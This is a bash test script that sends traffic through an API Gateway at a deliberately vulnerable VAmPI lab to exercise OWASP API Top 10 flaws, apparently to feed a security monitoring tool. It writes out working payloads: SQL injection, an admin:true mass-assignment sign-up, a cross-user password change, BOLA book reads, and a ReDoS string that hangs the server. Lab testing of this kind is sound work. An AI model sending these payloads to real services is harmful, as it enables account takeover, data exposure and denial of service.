#!/bin/bash
# Hits every VAmPI endpoint through the API Gateway.
# Exercises all OWASP API Top 10 vulnerability paths so Noname sees the full surface.
#
# Usage:
#   ./test-all-endpoints.sh           # single run
#   ./test-all-endpoints.sh --loop N  # repeat N times (default 3 when --loop is given)
#
# NOTE: The ReDoS test (API4) genuinely hangs the Flask worker thread. The script
# detects this, SSHes in to restart the container, and waits for recovery before
# continuing. Requires ~/.ssh/mcropsey-lab-key.pem to be present.

set -euo pipefail

# Resolved from the live stack so these never go stale after a --fresh redeploy
# (which mints a new API Gateway id and a new EIP). Override by exporting
# BASE_URL / EIP before running.
STACK="${STACK:-mcropsey-aws-gw-vampi}"
REGION="${REGION:-us-east-2}"

stack_out() {
  aws cloudformation describe-stacks --stack-name "$STACK" --region "$REGION" \
    --query "Stacks[0].Outputs[?OutputKey=='$1'].OutputValue" --output text 2>/dev/null
}

BASE_URL="${BASE_URL:-$(stack_out ApiGatewayURL)}"
EIP="${EIP:-$(stack_out ElasticIP)}"
PEM="$HOME/.ssh/mcropsey-lab-key.pem"

if [[ -z "$BASE_URL" || "$BASE_URL" == "None" ]]; then
  echo "ERROR: could not read ApiGatewayURL from stack '$STACK' in $REGION." >&2
  echo "       Deploy it first (./deploy-vampi.sh), or export BASE_URL yourself." >&2
  exit 1
fi

echo "==> BASE_URL: $BASE_URL"
echo "==> EIP:      $EIP"
LOOPS=1
if [[ "${1:-}" == "--loop" ]]; then LOOPS="${2:-3}"; fi

# ── helpers ────────────────────────────────────────────────────────────────────

pass() { printf '\e[32m  PASS\e[0m  %s\n' "$*"; }
fail() { printf '\e[31m  FAIL\e[0m  %s\n' "$*"; }
hdr()  { echo; echo "──────────────────────────────────────────"; echo "  $*"; echo "──────────────────────────────────────────"; }

call() {
  local label="$1"; shift
  local resp
  if resp=$(curl -fsS --max-time 15 "$@" 2>&1); then
    pass "$label"
  else
    fail "$label"
  fi
  printf '%s\n' "$resp" | head -5 | sed 's/^/    /'
}

call_raw() {
  # Doesn't exit on non-2xx or curl error; some endpoints intentionally return 4xx
  local label="$1"; shift
  local output http_code body
  output=$(curl -sS --max-time 15 -w '\n__STATUS__%{http_code}' "$@" 2>&1 || true)
  http_code=$(printf '%s' "$output" | grep -o '__STATUS__[0-9]*' | sed 's/__STATUS__//' || true)
  body=$(printf '%s' "$output" | grep -v '__STATUS__' || true)
  if [[ -n "$http_code" && "$http_code" != "000" ]]; then
    printf '  \e[32mOK\e[0m  %s  (HTTP %s)\n' "$label" "$http_code"
  elif [[ "$http_code" == "000" ]]; then
    printf '  \e[33mTIMEOUT\e[0m  %s\n' "$label"
  else
    printf '  \e[31mFAIL\e[0m  %s  (no response)\n' "$label"
  fi
  printf '%s\n' "$body" | head -3 | sed 's/^/    /'
}

login() {
  local user="$1" pass="$2"
  curl -sS --max-time 15 -X POST "$BASE_URL/users/v1/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"$pass\"}" | jq -r '.auth_token'
}

restart_container() {
  echo "  ==> ReDoS hung the Flask worker. Restarting container via SSH..."
  if [[ ! -f "$PEM" ]]; then
    echo "  WARNING: $PEM not found — restart the container manually:"
    echo "    ssh ec2-user@$EIP 'cd /opt/vampi && docker-compose restart && curl -s http://localhost:5000/createdb'"
    return
  fi
  ssh -i "$PEM" -o StrictHostKeyChecking=no -o ConnectTimeout=10 "ec2-user@$EIP" \
    'cd /opt/vampi && docker-compose restart vampi && sleep 3 && curl -s http://localhost:5000/createdb' 2>&1 | sed 's/^/      /'
  echo "  ==> Waiting 10s for Flask to be ready through the gateway..."
  sleep 10
}

# ── main loop ──────────────────────────────────────────────────────────────────

echo "BASE_URL: $BASE_URL"
echo "EIP:      $EIP"
echo "Loops:    $LOOPS"

for loop in $(seq 1 "$LOOPS"); do
  [[ "$LOOPS" -gt 1 ]] && echo && echo "════ Loop $loop / $LOOPS ════"

  # ── 1. Unauthenticated / setup ──────────────────────────────────────────────
  hdr "UNAUTHENTICATED"

  call     "GET  /  (home)"                              "$BASE_URL/"
  call     "GET  /createdb  (reseed DB)"                 "$BASE_URL/createdb"
  call     "GET  /users/v1  (list users)"                "$BASE_URL/users/v1"
  call     "GET  /users/v1/_debug  [API3: data exposure]" "$BASE_URL/users/v1/_debug"

  # API6 — Mass Assignment
  call_raw "POST /users/v1/register  (normal user)" \
    -X POST "$BASE_URL/users/v1/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser","password":"testpass","email":"test@test.com"}'

  call_raw "POST /users/v1/register  [API6: admin:true mass assignment]" \
    -X POST "$BASE_URL/users/v1/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"eviluser","password":"evilpass","email":"evil@evil.com","admin":true}'

  # API2 — Broken Auth
  call     "POST /users/v1/login  (name1/pass1)"         \
    -X POST "$BASE_URL/users/v1/login" -H "Content-Type: application/json" \
    -d '{"username":"name1","password":"pass1"}'

  call     "POST /users/v1/login  (name2/pass2)"         \
    -X POST "$BASE_URL/users/v1/login" -H "Content-Type: application/json" \
    -d '{"username":"name2","password":"pass2"}'

  call_raw "POST /users/v1/login  [API2: wrong password enumeration]" \
    -X POST "$BASE_URL/users/v1/login" -H "Content-Type: application/json" \
    -d '{"username":"name1","password":"wrongpass"}'

  call_raw "POST /users/v1/login  [API2: nonexistent user enumeration]" \
    -X POST "$BASE_URL/users/v1/login" -H "Content-Type: application/json" \
    -d '{"username":"nobody","password":"nothing"}'

  # ── 2. Acquire tokens ───────────────────────────────────────────────────────
  hdr "ACQUIRING TOKENS"
  TOKEN1=$(login name1 pass1)
  TOKEN2=$(login name2 pass2)
  TOKEN_ADMIN=$(login admin pass1)
  echo "  name1  token: ${TOKEN1:0:40}..."
  echo "  name2  token: ${TOKEN2:0:40}..."
  echo "  admin  token: ${TOKEN_ADMIN:0:40}..."

  # ── 3. Authenticated — user endpoints ───────────────────────────────────────
  hdr "AUTHENTICATED — USER ENDPOINTS"

  call     "GET  /me  (name1)"     "$BASE_URL/me" -H "Authorization: Bearer $TOKEN1"
  call     "GET  /me  (name2)"     "$BASE_URL/me" -H "Authorization: Bearer $TOKEN2"

  call     "GET  /users/v1/name1"  "$BASE_URL/users/v1/name1"  -H "Authorization: Bearer $TOKEN1"
  call     "GET  /users/v1/name2"  "$BASE_URL/users/v1/name2"  -H "Authorization: Bearer $TOKEN2"
  call     "GET  /users/v1/admin"  "$BASE_URL/users/v1/admin"  -H "Authorization: Bearer $TOKEN_ADMIN"

  # API7 — SQLi (URL-encoded spaces, --globoff to pass literal single quotes)
  call_raw "GET  /users/v1/{username}  [API7: SQLi]" \
    --globoff "$BASE_URL/users/v1/name1'%20OR%20'1'='1" \
    -H "Authorization: Bearer $TOKEN1"

  # PUT email — own user (legitimate)
  call_raw "PUT  /users/v1/name1/email  (own email update)" \
    -X PUT "$BASE_URL/users/v1/name1/email" \
    -H "Authorization: Bearer $TOKEN1" -H "Content-Type: application/json" \
    -d '{"email":"name1_new@mail.com"}'

  # API8 — BOLA: name1 changes name2's password
  call_raw "PUT  /users/v1/name2/password  [API8: unauthorized pw change]" \
    -X PUT "$BASE_URL/users/v1/name2/password" \
    -H "Authorization: Bearer $TOKEN1" -H "Content-Type: application/json" \
    -d '{"password":"hacked123"}'

  # Own password change (reset back)
  call_raw "PUT  /users/v1/name1/password  (own password change)" \
    -X PUT "$BASE_URL/users/v1/name1/password" \
    -H "Authorization: Bearer $TOKEN1" -H "Content-Type: application/json" \
    -d '{"password":"pass1"}'

  # API5 — BFLA: non-admin tries to delete
  call_raw "DELETE /users/v1/name2  [API5: BFLA delete as non-admin]" \
    -X DELETE "$BASE_URL/users/v1/name2" -H "Authorization: Bearer $TOKEN1"

  # Admin deletes test users (cleanup)
  call_raw "DELETE /users/v1/testuser  (admin delete)" \
    -X DELETE "$BASE_URL/users/v1/testuser" -H "Authorization: Bearer $TOKEN_ADMIN"
  call_raw "DELETE /users/v1/eviluser  (admin delete)" \
    -X DELETE "$BASE_URL/users/v1/eviluser" -H "Authorization: Bearer $TOKEN_ADMIN"

  # ── 4. Authenticated — book endpoints ───────────────────────────────────────
  hdr "AUTHENTICATED — BOOK ENDPOINTS"

  call     "GET  /books/v1  (name1)"  "$BASE_URL/books/v1" -H "Authorization: Bearer $TOKEN1"
  call     "GET  /books/v1  (name2)"  "$BASE_URL/books/v1" -H "Authorization: Bearer $TOKEN2"

  call_raw "POST /books/v1  (name1 adds book)" \
    -X POST "$BASE_URL/books/v1" \
    -H "Authorization: Bearer $TOKEN1" -H "Content-Type: application/json" \
    -d '{"book_title":"MyLabBook","secret":"supersecret_name1"}'

  call_raw "POST /books/v1  (name2 adds book)" \
    -X POST "$BASE_URL/books/v1" \
    -H "Authorization: Bearer $TOKEN2" -H "Content-Type: application/json" \
    -d '{"book_title":"Name2Book","secret":"supersecret_name2"}'

  # GET own book
  call_raw "GET  /books/v1/bookTitle88  (name1 own book)" \
    "$BASE_URL/books/v1/bookTitle88" -H "Authorization: Bearer $TOKEN1"

  # API1 — BOLA: cross-user book reads
  call_raw "GET  /books/v1/bookTitle33  [API1: BOLA — name1 reads name2's book]" \
    "$BASE_URL/books/v1/bookTitle33" -H "Authorization: Bearer $TOKEN1"
  call_raw "GET  /books/v1/bookTitle54  [API1: BOLA — name1 reads admin's book]" \
    "$BASE_URL/books/v1/bookTitle54" -H "Authorization: Bearer $TOKEN1"

  call_raw "GET  /books/v1/doesnotexist  (404 expected)" \
    "$BASE_URL/books/v1/doesnotexist" -H "Authorization: Bearer $TOKEN1"

  # ── 5. Auth bypass attempts ──────────────────────────────────────────────────
  hdr "AUTH BYPASS ATTEMPTS (no token)"

  call_raw "GET    /me         (no token)" "$BASE_URL/me"
  call_raw "GET    /books/v1   (no token)" "$BASE_URL/books/v1"
  call_raw "DELETE /users/v1/name1  (no token)" -X DELETE "$BASE_URL/users/v1/name1"

  # ── 6. API4 ReDoS — MUST BE LAST: hangs the Flask worker ───────────────────
  hdr "API4 — ReDoS (run last; restarts container after)"

  echo "  Sending ReDoS payload — Flask will hang. Timeout expected..."
  call_raw "PUT  /users/v1/name1/email  [API4: ReDoS]" \
    -X PUT "$BASE_URL/users/v1/name1/email" \
    -H "Authorization: Bearer $TOKEN1" -H "Content-Type: application/json" \
    -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab@"}'

  restart_container

  # Confirm recovery
  call "GET  /  (recovery check after ReDoS restart)" "$BASE_URL/"
  call "GET  /createdb  (reseed after restart)" "$BASE_URL/createdb"

  # ── 7. Done ──────────────────────────────────────────────────────────────────
  hdr "DONE — loop $loop / $LOOPS complete"

done

echo
echo "Finished $LOOPS loop(s). All VAmPI endpoints exercised."
